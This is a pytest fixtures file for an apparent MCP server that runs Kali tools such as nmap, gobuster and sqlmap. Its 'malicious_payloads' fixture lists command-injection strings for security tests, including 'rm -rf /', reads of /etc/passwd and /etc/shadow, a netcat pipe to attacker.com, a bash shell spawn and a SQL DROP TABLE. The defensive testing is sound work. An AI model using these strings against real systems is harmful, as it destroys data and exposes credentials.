#!/usr/bin/env python3
"""
Shared test fixtures and utilities for MCP Kali Server tests.
"""

import pytest
import sys
import os
from unittest.mock import Mock, MagicMock, patch
import subprocess

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import kali_server
import mcp_server


@pytest.fixture
def flask_app():
    """Provide Flask app instance for testing."""
    app = kali_server.app
    app.config['TESTING'] = True
    return app


@pytest.fixture
def flask_client(flask_app):
    """Provide Flask test client."""
    return flask_app.test_client()


@pytest.fixture
def mock_subprocess_popen():
    """Mock subprocess.Popen for command execution tests."""
    with patch('subprocess.Popen') as mock_popen:
        mock_process = MagicMock()
        mock_process.stdout.readline = MagicMock(return_value='')
        mock_process.stderr.readline = MagicMock(return_value='')
        mock_process.wait = MagicMock(return_value=0)
        mock_process.terminate = MagicMock()
        mock_process.kill = MagicMock()
        mock_popen.return_value = mock_process
        yield mock_popen, mock_process


@pytest.fixture
def mock_successful_command():
    """Mock a successful command execution."""
    with patch('subprocess.Popen') as mock_popen:
        mock_process = MagicMock()
        mock_process.stdout.readline = MagicMock(side_effect=['test output\n', ''])
        mock_process.stderr.readline = MagicMock(return_value='')
        mock_process.wait = MagicMock(return_value=0)
        mock_popen.return_value = mock_process
        yield mock_popen


@pytest.fixture
def mock_failed_command():
    """Mock a failed command execution."""
    with patch('subprocess.Popen') as mock_popen:
        mock_process = MagicMock()
        mock_process.stdout.readline = MagicMock(return_value='')
        mock_process.stderr.readline = MagicMock(side_effect=['error message\n', ''])
        mock_process.wait = MagicMock(return_value=1)
        mock_popen.return_value = mock_process
        yield mock_popen


@pytest.fixture
def mock_timeout_command():
    """Mock a command that times out."""
    with patch('subprocess.Popen') as mock_popen:
        mock_process = MagicMock()
        mock_process.stdout.readline = MagicMock(side_effect=['partial output\n', ''])
        mock_process.stderr.readline = MagicMock(return_value='')
        mock_process.wait = MagicMock(side_effect=subprocess.TimeoutExpired('cmd', 1))
        mock_process.terminate = MagicMock()
        mock_process.kill = MagicMock()
        mock_popen.return_value = mock_process
        yield mock_popen


@pytest.fixture
def kali_client():
    """Provide KaliToolsClient instance for testing."""
    return mcp_server.KaliToolsClient("http://localhost:5000", timeout=10)


@pytest.fixture
def mock_requests_post():
    """Mock requests.post for API client tests."""
    with patch('requests.post') as mock_post:
        mock_response = MagicMock()
        mock_response.json.return_value = {"success": True, "stdout": "test output"}
        mock_response.raise_for_status = MagicMock()
        mock_post.return_value = mock_response
        yield mock_post


@pytest.fixture
def mock_requests_get():
    """Mock requests.get for API client tests."""
    with patch('requests.get') as mock_get:
        mock_response = MagicMock()
        mock_response.json.return_value = {"status": "healthy"}
        mock_response.raise_for_status = MagicMock()
        mock_get.return_value = mock_response
        yield mock_get


@pytest.fixture
def sample_nmap_payload():
    """Sample nmap request payload."""
    return {
        "target": "192.168.1.1",
        "scan_type": "-sV",
        "ports": "80,443",
        "additional_args": "-T4"
    }


@pytest.fixture
def sample_gobuster_payload():
    """Sample gobuster request payload."""
    return {
        "url": "http://example.com",
        "mode": "dir",
        "wordlist": "/usr/share/wordlists/dirb/common.txt",
        "additional_args": "-t 50"
    }


@pytest.fixture
def sample_sqlmap_payload():
    """Sample sqlmap request payload."""
    return {
        "url": "http://example.com/login",
        "data": "username=admin&password=test",
        "additional_args": "--level=2"
    }


@pytest.fixture
def malicious_payloads():
    """Common malicious input patterns for security testing."""
    return [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "| nc attacker.com 1234",
        "`whoami`",
        "$(id)",
        "../../../etc/passwd",
        "'; DROP TABLE users--",
        "\n/bin/bash -i",
        "'; cat /etc/shadow #",
    ]


@pytest.fixture(autouse=True)
def reset_environment():
    """Reset environment variables after each test."""
    original_env = os.environ.copy()
    yield
    os.environ.clear()
    os.environ.update(original_env)


@pytest.fixture
def mock_which_command():
    """Mock 'which' command for health check tests."""
    def _mock_execute(command):
        if isinstance(command, str):
            command = command.split()

        if command[0] == 'which':
            tool = command[1]
            if tool in ['nmap', 'gobuster', 'dirb', 'nikto']:
                return {
                    "stdout": f"/usr/bin/{tool}\n",
                    "stderr": "",
                    "return_code": 0,
                    "success": True
                }
            else:
                return {
                    "stdout": "",
                    "stderr": "",
                    "return_code": 1,
                    "success": False
                }
        return {
            "stdout": "",
            "stderr": "",
            "return_code": 0,
            "success": True
        }

    return _mock_execute
